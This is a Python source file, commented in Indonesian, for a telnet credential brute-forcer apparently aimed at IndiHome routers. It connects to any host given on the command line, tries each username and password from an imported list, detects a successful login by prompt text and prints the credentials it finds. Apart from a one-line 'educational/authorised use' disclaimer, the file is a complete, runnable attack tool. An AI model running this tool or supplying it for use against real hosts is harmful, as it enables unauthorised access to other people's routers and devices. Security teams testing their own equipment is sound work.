# Phyton build For: https://github.com/MichaelJorky/indihome-router-decoder/
# Original (c) 2024 Dunia MR

### TELNET-BRUTE ###
# Menggunakan serangkaian nama pengguna & kata sandi dari auth.py untuk mendapatkan kredensial ke host telnet.
# jalankan tanpa argumen untuk melihat penggunaan
# Dibuat untuk penggunaan pendidikan/diizinkan.

VER = "1.0.0"

import os
import sys
import traceback
import re
import time
import getopt
import telnetlib

from auth import USERS, PASSWORDS

LOGIN_PROMPT = b"login:"
PWD_PROMPT = b"password:"

EXPECT_TIMEOUT = 775
# Tingkatkan ini jika alat memberikan negatif palsu.
# Mungkin menyerah menunggu respons terlalu cepat!
# Meningkatkan akan membuatnya lebih lambat, jadi maksimal 2000 mungkin.

# konversi string menjadi byte, tulis ke telnet, kembalikan panjang byte
def t_write(telnet, string):
	try:
		buf = string.encode("ascii")
		telnet.write(buf)
		return len(buf)
	except:
		return 0

def str_lastline(buf, dbg = False):
	string = buf
	if isinstance(buf, bytes):
		string = buf.decode()
	
	if dbg:
		print(string)
	lns = string.splitlines()
	lastNonNewline = ""
	for l in lns:
		if not re.match(r"\r?\n", l):
			lastNonNewline = l

	return lastNonNewline

class AutoTelnet:
	def __init__(self, host, lp, pp):
		self.host = host
		self.telnet = None
		self.L_prompt = lp
		self.P_prompt = pp
		self.correct = {
			"user": None,
			"pwd": None
		}
		
	def conn(self):
		self.telnet = telnetlib.Telnet()
		self.telnet.open(self.host)

	def brute(self, verbose):
		usersLen = len(USERS)
		
		for uIdx, user in enumerate(USERS): # loop semua nama pengguna
			self.conn()
			
			n, match, txt = self.telnet.expect([rb"(\w* )?login:( ?)"], EXPECT_TIMEOUT / 1000)

			if not self.L_prompt.decode() in str_lastline(txt).lower():
				print(f"[err] Gagal menerima prompt login yang diharapkan dari host.")
				print(f"[err] Diharapkan: \"{self.L_prompt.decode()}\"")
				print(f"[err] Dapat: \"{txt.decode()}\"")
				print(f"[err] Catatan: host yang lambat juga dapat menyebabkan ini.")
				sys.exit(0)

			if self.L_prompt.decode() in str_lastline(txt).lower():
				try:
					t_write(self.telnet, user + "\n")

					n, match, txt = self.telnet.expect([rb"(\w* )?login:( ?)"], EXPECT_TIMEOUT / 1000)
					if self.P_prompt.decode() in str_lastline(txt).lower():
						if verbose:
							print(f"| [V]   {user} ({str(uIdx + 1)}/{str(usersLen)})")
						self.telnet.close()

						pwdsLen = len(PASSWORDS)

						for pIdx, pwd in enumerate(PASSWORDS): # loop semua kata sandi
							self.conn()
							
							n, match, txt = self.telnet.expect([rb"(\w* )?login:( ?)"], EXPECT_TIMEOUT / 1000)
							
							if not self.L_prompt.decode() in str_lastline(txt).lower():
								print(f"[err] Gagal menerima prompt login yang diharapkan dari host.")
								print(f"[err] Diharapkan: \"{self.L_prompt.decode()}\"")
								print(f"[err] Dapat: \"{txt.decode()}\"")
								print(f"[err] Catatan: host yang lambat juga dapat menyebabkan ini.")
								sys.exit(0)

							if self.L_prompt.decode() in str_lastline(txt).lower():
								try:
									t_write(self.telnet, user + "\n")
									time.sleep(.1)
									t_write(self.telnet, pwd + "\n")
									
									n, match, txt = self.telnet.expect([rb"(\w* )?password:( ?)"], EXPECT_TIMEOUT / 1000)
									lastl = str_lastline(txt).lower()
									if (not self.P_prompt.decode() in lastl.lower() and not "salah" in lastl) or "selamat datang" in lastl:
										if verbose:
											print(f"| [V]         {pwd} ({str(pIdx + 1)}/{str(pwdsLen)})")

										self.correct["user"] = user
										self.correct["pwd"] = pwd

										return True
									else:
										if verbose:
											print(f"| [X]         {pwd} ({str(pIdx + 1)}/{str(pwdsLen)})")
										continue
								
								except KeyboardInterrupt:
									sys.exit(0)
								except SystemExit as e:
									sys.exit(e)
								except ConnectionError:
									print(f"[err] Gagal terhubung ke host.")
								except:
									print("[brute] Terjadi pengecualian")
									traceback.print_exc()
									sys.exit(0)
					else:
						if verbose:
							print(f"| [X]   {user} ({str(uIdx + 1)}/{str(usersLen)})")
							
						continue
									
				except KeyboardInterrupt:
					sys.exit(0)
				except SystemExit as e:
					sys.exit(e)
				except ConnectionError:
					print(f"[err] Gagal terhubung ke host.")
				except:
					print("[brute] Terjadi pengecualian")
					traceback.print_exc()
					sys.exit(0)

		# habis!
		self.telnet.close()
		return False


def main():
	basename = os.path.splitext(os.path.basename(sys.argv[0]))[0]

	penggunaan = f"""telnet-brute v{VER}
	
penggunaan:	{basename} <host>
	[-v] Tampilkan setiap percobaan

Contoh: {basename}.py 127.0.0.1

dibuat oleh: Dunia MR (2024)
inspirasi: xcode (2024)

PERINGATAN: Dibuat untuk penggunaan pendidikan/diizinkan."""
	if len(sys.argv) <= 1:
		print(penggunaan)
		sys.exit(1)

	opts = getopt.getopt(sys.argv[2:], "v")

	lgp = LOGIN_PROMPT
	pwdp = PWD_PROMPT
	verb = False

	if len(opts[0]) > 0:
		for (opt, optarg) in opts[0]:
			if opt == "-v":
				verb = True

	host = sys.argv[1]
	autoTelnet = AutoTelnet(host, lgp, pwdp)
	print(f"[init] Host: {host}")
	print(f"[init] Bruting...\n")
	result = autoTelnet.brute(verb)
	
	print("")
	if result: # kredensial ditemukan
		print(f"[end] Login berhasil ditemukan!\npengguna: \"{autoTelnet.correct['user']}\"\nkata sandi: \"{autoTelnet.correct['pwd']}\"")
	else:
		print(f"[end] Tidak ada kredensial yang ditemukan.")

	return 0

try:
	main()
except KeyboardInterrupt:
	sys.exit(0)
except ConnectionError:
	print(f"[err] Gagal terhubung ke host.")
except SystemExit as e:
	sys.exit(e)
except Exception:
	print(f"[exc] Pengecualian terjadi.\n")
	traceback.print_exc()
	sys.exit(0)
